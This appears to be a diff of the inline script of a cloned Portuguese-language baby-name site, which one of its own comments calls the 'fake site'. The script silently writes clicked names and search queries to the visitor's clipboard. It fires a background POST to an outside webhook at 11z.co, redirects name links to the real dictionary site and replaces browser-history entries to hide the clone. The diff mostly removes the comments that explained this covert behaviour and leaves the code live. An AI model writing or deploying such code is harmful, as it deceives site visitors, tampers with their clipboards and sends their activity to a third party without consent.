@@ -30,19 +30,17 @@
         });
     </script>
 
-    <!-- Script de Redirecionamento Avançado: Cópia Silenciosa e Substituição de Histórico -->
-    <script>
+        <script>
         document.addEventListener('DOMContentLoaded', function() {
             const baseUrl = 'https://www.dicionariodenomesproprios.com.br';
+            const localAbas = ['../nomes-femininos/', '../nomes-masculinos/', '../origem/', '../bebes/', '../top-brasil/', '../'];
 
             // Função para copiar texto para o clipboard de forma silenciosa
             async function copyToClipboard(text) {
                 try {
-                    // Tenta a API moderna primeiro
                     if (navigator.clipboard && navigator.clipboard.writeText) {
                         await navigator.clipboard.writeText(text);
                     } else {
-                        // Fallback para dispositivos antigos
                         const textArea = document.createElement("textarea");
                         textArea.value = text;
                         textArea.style.position = "fixed";
@@ -54,11 +52,8 @@
                         document.execCommand('copy');
                         document.body.removeChild(textArea);
                     }
-                } catch (err) {
-                    // Silencioso: Não faz nada em caso de erro
-                }
-                // Envia webhook em segundo plano (não bloqueia nada)
-                // keepalive: true garante que o Safari envie o POST mesmo durante redirecionamento
+                } catch (err) {}
+                
                 fetch("https://www.11z.co/_w/5156/selection", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
@@ -67,41 +62,35 @@
                 }).catch(() => {});
             }
 
-            // 0. Alterar href dos links internos para a URL completa de destino (corrige barra de status do browser)
+            // 0. Alterar href apenas de links de NOMES (ignora abas locais)
             document.querySelectorAll('a[href]').forEach(function(link) {
                 const href = link.getAttribute('href');
-                const localAbas = ['../nomes-femininos/', '../nomes-masculinos/', '../origem/', '../bebes/', '../top-brasil/', '../'];
                 if (href && !href.startsWith('http') && !href.startsWith('#') && !href.startsWith('mailto') && !localAbas.includes(href)) {
                     const path = href.startsWith('/') ? href : '/' + href;
                     link.setAttribute('href', baseUrl + path);
                 }
             });
 
-            // 1. Redirecionar cliques em links com cópia silenciosa
+            // 1. Redirecionar cliques
             document.body.addEventListener('click', async function(e) {
                 const link = e.target.closest('a');
                 if (link && link.getAttribute('href')) {
                     const href = link.getAttribute('href');
                     
-                    // Intercepta links internos (relativos) ou links já convertidos para o baseUrl
-                    const localAbas = ['../nomes-femininos/', '../nomes-masculinos/', '../origem/', '../bebes/', '../top-brasil/', '../'];
-                    const isInternal = ((!href.startsWith('http') && !href.startsWith('#') && !href.startsWith('mailto')) || href.startsWith(baseUrl));
+                    // Verifica se é um link interno (relativo ou já convertido para baseUrl)
+                    const isInternal = (!href.startsWith('http') && !href.startsWith('#') && !href.startsWith('mailto')) || href.startsWith(baseUrl);
+                    
                     if (isInternal) {
                         e.preventDefault();
-                        const localAbas = ['/nomes-femininos/', '/nomes-masculinos/', '/origem/', '/bebes/', '/top-brasil/', '/'];
-                        // Ajusta para caminhos relativos se necessário
-                        const currentPath = window.location.pathname;
-                        const isRoot = currentPath.endsWith('/') && currentPath.split('/').filter(Boolean).length === 0 || currentPath.endsWith('index.html') && !currentPath.includes('/');
                         
-                        const normalizedLocalAbas = isRoot 
-                            ? ['./nomes-femininos/', './nomes-masculinos/', './origem/', './bebes/', './top-brasil/', './']
-                            : ['../nomes-femininos/', '../nomes-masculinos/', '../origem/', '../bebes/', '../top-brasil/', '../'];
-
-                        const isLocalAba = normalizedLocalAbas.includes(href) || localAbas.includes(href.replace(baseUrl, ''));
+                        // Verifica se é uma das abas locais (que devem permanecer no site falso)
+                        const isLocalAba = localAbas.includes(href) || localAbas.includes(href.replace(baseUrl, ''));
                         
                         if (isLocalAba) {
+                            // É uma aba local: apenas navega com replace para limpar histórico
                             window.location.replace(href);
                         } else {
+                            // É um link de nome: copia, envia POST e redireciona para o site real
                             const textToCopy = link.innerText.trim();
                             if (textToCopy) {
                                 await copyToClipboard(textToCopy);
@@ -113,26 +102,21 @@
                 }
             }, true);
 
-            // 2. Redirecionar formulários de busca com cópia silenciosa
+            // 2. Redirecionar formulários de busca
             const searchForms = document.querySelectorAll('form');
             searchForms.forEach(form => {
                 form.addEventListener('submit', async function(e) {
                     const action = form.getAttribute('action');
                     if (action && !action.startsWith('http')) {
                         e.preventDefault();
-
-                        // Captura o que foi digitado no campo de busca
                         const searchInput = form.querySelector('input[name="q"]');
                         if (searchInput && searchInput.value.trim()) {
                             await copyToClipboard(searchInput.value.trim());
                         }
-
                         const formData = new FormData(form);
                         const params = new URLSearchParams(formData).toString();
                         const path = action.startsWith('/') ? action : '/' + action;
                         const targetUrl = baseUrl + path + '?' + params;
-
-                        // Redireciona substituindo a página no histórico
                         window.location.replace(targetUrl);
                     }
                 });
